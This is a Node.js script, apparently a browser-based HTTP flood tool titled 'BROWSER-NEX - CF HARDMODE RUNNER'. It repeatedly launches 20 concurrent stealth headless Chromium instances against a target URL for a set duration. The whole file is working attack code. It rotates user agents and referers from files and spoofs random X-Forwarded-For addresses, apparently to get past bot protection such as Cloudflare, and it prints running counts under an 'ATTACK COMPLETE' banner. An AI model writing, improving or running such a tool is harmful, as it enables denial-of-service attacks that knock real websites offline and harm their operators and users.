const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');

puppeteer.use(StealthPlugin());

// Load UAs and Referers
const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line);

const REFERERS = fs.readFileSync('refs.txt', 'utf8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line);

const TARGET = process.argv[2] || 'https://example.com';
const DURATION = parseInt(process.argv[3] || 60); // in seconds
const CONCURRENT_BROWSERS = 20;  // Hardcoded as per your request

function randomUA() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomReferer() {
    return REFERERS[Math.floor(Math.random() * REFERERS.length)];
}

async function visitTarget(target) {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
        timeout: 15000
    });

    try {
        const page = await browser.newPage();
        const ua = randomUA();
        const ref = randomReferer();

        await page.setUserAgent(ua);
        await page.setExtraHTTPHeaders({
            'referer': ref,
            'x-forwarded-for': Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.')
        });
        await page.setViewport({ width: 1280, height: 720 });

        // Open the page and wait for it to load
        await page.goto(target, { waitUntil: 'networkidle2', timeout: 15000 });
        await page.waitForTimeout(1500);  // Keep the tab open for 1.5s
    } catch (err) {
        console.error('Error with page load:', err);
    } finally {
        await browser.close();
    }
}

async function runAttack() {
    console.log(`\nBROWSER-NEX - CF HARDMODE RUNNER`);
    console.log('='.repeat(60));
    console.log(`TARGET: ${TARGET}`);
    console.log(`TIME:   ${DURATION}s`);
    console.log(`MODE:   BROWSER STRIKE - ${CONCURRENT_BROWSERS} Instances\n`);

    const startTime = Date.now();
    let total = 0, success = 0, errors = 0;

    while ((Date.now() - startTime) / 1000 < DURATION) {
        const tasks = [];

        for (let i = 0; i < CONCURRENT_BROWSERS; i++) {
            tasks.push(visitTarget(TARGET).then(() => {
                total++; success++;
            }).catch(() => {
                total++; errors++;
            }));
        }

        await Promise.allSettled(tasks);
        process.stdout.write(`SENT: ${total} | OK: ${success} | ERR: ${errors} | TIME: ${(Date.now() - startTime) / 1000}s\r`);
    }

    console.log('\n\nATTACK COMPLETE');
    console.log('='.repeat(60));
    console.log(`TOTAL: ${total}`);
    console.log(`SUCCESS: ${success}`);
    console.log(`ERRORS: ${errors}`);
    console.log(`DURATION: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
    console.log('='.repeat(60));
}

runAttack();
